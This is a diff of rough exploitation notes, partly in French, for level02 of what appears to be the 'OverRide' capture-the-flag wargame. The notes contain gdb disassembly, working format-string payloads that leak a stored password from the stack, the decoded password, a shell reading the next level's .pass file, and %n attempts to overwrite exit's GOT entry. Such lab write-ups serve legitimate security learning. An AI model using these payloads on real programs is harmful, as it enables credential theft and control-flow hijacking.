@@ -408,3 +408,230 @@ python -c "print '\x3a\x0d\x40\x00' + '%28\$n'"
 python -c "print '\x3a\x0d\x40\x00' + '%28\$n'" | ./level02
 
 NOPE
+
+
+__________________________________
+
+   0x0000000000400a51 <+573>:	lea    -0xa0(%rbp),%rax
+   0x0000000000400a58 <+580>:	mov    $0x29,%edx
+   0x0000000000400a5d <+585>:	mov    %rcx,%rsi
+   0x0000000000400a60 <+588>:	mov    %rax,%rdi
+   0x0000000000400a63 <+591>:	callq  0x400670 <strncmp@plt>
+
+-0xa0(%rbp) -> rax -> rdi
+strncmp(rdi, rsi, edx) -> strncmp(local_a8,local_118,0x29);
+fread(local_a8,1,0x29,local_10); WHERE local_10 = fopen("/home/users/level03/.pass","r");
+
+Donc print local_a8 = print pass
+
+   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>
+   0x0000000000400aa7 <+659>:	mov    $0x400d3a,%edi
+   0x0000000000400aac <+664>:	callq  0x400680 <puts@plt>
+
+   print that overwrite, only this possible to overwrite is puts().
+
+$0x400d3a,%edi
+ovewrite $0x400d3a : $0x400d3a -> edi -> puts
+
+overwrite edi : $0x400d3a -> edi -> overwrite edi -> puts
+
+
+
+
+python -c "print '\x3a\x0d\x40\x00' + '%28\$n'" | ./level02
+
+NOPE
+
+_____________________
+
+
+Format String **READ**
+
+  0x0000000000400a51 <+573>:	lea    -0xa0(%rbp),%rax
+   0x0000000000400a58 <+580>:	mov    $0x29,%edx
+   0x0000000000400a5d <+585>:	mov    %rcx,%rsi
+   0x0000000000400a60 <+588>:	mov    %rax,%rdi
+   0x0000000000400a63 <+591>:	callq  0x400670 <strncmp@plt>
+
+-0xa0(%rbp) -> rax -> rdi
+strncmp(rdi, rsi, edx) -> strncmp(local_a8,local_118,0x29);
+fread(local_a8,1,0x29,local_10); WHERE local_10 = fopen("/home/users/level03/.pass","r");
+
+Donc read via %p local_a8 = print pass
+
+0xa0
+
+   0x0000000000400a96 <+642>:	lea    -0x70(%rbp),%rax
+   0x0000000000400a9a <+646>:	mov    %rax,%rdi
+   0x0000000000400a9d <+649>:	mov    $0x0,%eax
+   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>
+
+
+-0x70(%rbp) -> rax -> rdi
+  printf(rdi); ->   printf(local_78);
+
+
+Ce qu'on print est a : 0x70
+
+----
+
+rpb
+
+0x70 - rbp-112
+
+[48]
+
+0xa0 - rbp-160
+
+
+local_78 -> 28 element dans la stack
+
+chaque element = 8 bytes
+
+48 / 8 = 6 => 6 elements decart.
+
+
+28 - 6 = 22
+
+rpb
+
+0x70 - rbp-112 - element 22
+
+[48 - 6 element]
+
+0xa0 - rbp-160 - element 28
+
+
+pass = 40 bytes = 5 element
+
+=> print 5 elements de 22 a 27.
+
+
+
+%22$p.%23$p.%24$p.%25$p.%26$p.%27$p
+
+level02@OverRide:~$ ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %22$p.%23$p.%24$p.%25$p.%26$p.%27$p
+--[ Password: password
+*****************************************
+0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.0xfeff00 does not have access!
+
+(python -c "print '%22\$p.%23\$p.%24\$p.%25\$p.%26\$p.%27\$p'"; sleep 1; echo "password") | ./level02
+
+level02@OverRide:~$ (python -c "print '%22\$p.%23\$p.%24\$p.%25\$p.%26\$p.%27\$p'"; sleep 1; echo "password") | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.0xfeff00 does not have access!
+
+
+0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.0xfeff00
+
+sans point ----
+
+[...]
+
+0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d0xfeff00
+
+__________________________________
+
+
+Clean:
+
+%22$p%23$p%24$p%25$p%26$p
+
+level02@OverRide:~$ ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %22$p%23$p%24$p%25$p%26$p
+--[ Password: password
+*****************************************
+0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
+
+---
+
+level02@OverRide:~$ (python -c "print '%22\$p%23\$p%24\$p%25\$p%26\$p'"; sleep 1; echo "password") | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
+
+0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
+
+---
+
+aoberon@f4r7s16 ~/4/E/O/l/Ressources (master)> python3 decrypt.py 0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+
+
+level02@OverRide:~$ ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: a
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+*****************************************
+Greetings, a!
+$ id
+uid=1002(level02) gid=1002(level02) euid=1003(level03) egid=100(users) groups=1003(level03),100(users),1002(level02)
+$ cat /home/users/level03/.pass
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+$ exit
+
+
+______________________________________________________________-
+
+
+
+(gdb) disas exit
+Dump of assembler code for function exit@plt:
+   0x0000000000400710 <+0>:	jmpq   *0x200b12(%rip)        # 0x601228 <exit@got.plt>
+   0x0000000000400716 <+6>:	pushq  $0xa
+   0x000000000040071b <+11>:	jmpq   0x400660
+End of assembler dump.
+
+
+0x0000000000400a85 <+625>:	mov    $0x400d32,%edi
+   0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt>
+
+
+%28\$n
+
+[address to update] [padding] %28\$n
+└────────┬────────┘ └───┬───┘ 
+		 4				?		
+└─────────────┬─────────────┘
+			  ??
+
+? = ?? - 4
+
+?? = set address to update
+
+
+exit GOT -> system call  ?
+
+
+0x601228 -> 0x0000000000400a85
+
+\x28\x12\x60 -> 4196997
+
+
+\x28\x12\x60 %4196997x %28\$n
+
+(python "print '\x28\x12\x60' + '%4196997x' + '%28\$n'") | ./level02	-> fonctionne pas
+
+(python -c 'print "%4196997d" + "%8$n"' ; python -c 'print "\x28\x12\x60"'; cat) | ./level02	-> fonctionne
+
+(python -c "print '%4196997d' + '%8$n'" ; python -c "print '\x28\x12\x60'"; cat) | ./level02	-> fonctionne pas
